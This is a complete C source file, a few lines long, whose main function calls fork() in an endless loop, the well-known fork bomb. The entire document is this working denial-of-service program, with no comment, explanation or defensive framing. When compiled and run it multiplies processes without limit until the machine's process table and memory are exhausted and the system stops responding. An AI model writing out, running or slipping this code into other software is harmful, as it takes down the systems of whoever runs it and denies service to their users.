#include <stdio.h>
#include <unistd.h>

int main() {
	for(;;)
		fork();
}
